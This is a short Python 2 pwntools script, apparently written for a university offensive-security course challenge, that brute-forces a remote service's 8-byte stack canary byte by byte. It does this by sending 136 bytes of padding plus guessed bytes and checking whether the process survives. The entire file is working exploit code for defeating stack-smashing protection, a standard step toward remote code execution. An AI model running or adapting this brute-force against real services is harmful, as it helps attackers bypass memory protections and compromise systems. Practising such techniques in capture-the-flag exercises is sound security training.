#!/usr/bin/env python2

from pwn import *
import time
import struct

PADDING = 136
canary = []

#challenge-specific info
host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
port = 1340
netid='pk1898'
r = remote(host, port)
for cb in range(8):

    currentByte = 0x00
    for i in range(255):
        r = remote(host, port)
        r.sendline(netid)
        print r.recvline()
        print r.recvuntil("First, how long is your name?")
        size = str(PADDING + cb + 1)
        print size
        print r.sendline(size)
        print r.recvuntil("of data")
        print "[+] Trying %s (Byte #%d)..." % (hex(currentByte), cb + 1)


        DATA = "A" * PADDING
        DATA += "".join([struct.pack("B", c) for c in canary])
        DATA += struct.pack("B", currentByte)

        print DATA
        r.sendline(DATA)

        received = ""
        try:
            received = r.recvuntil("and goodbye!")
            print received
        except EOFError:
            print "Process Died"
        finally:
            r.close()


        if "and goodbye!" in received:
            canary.append(currentByte)
            print "\n[*] Byte #%d is %s\n" % (cb + 1, hex(currentByte))
            currentByte = 0x00
            break
        else:
            currentByte += 1

print "Found Canary:"
print " ".join([hex(c) for c in canary])
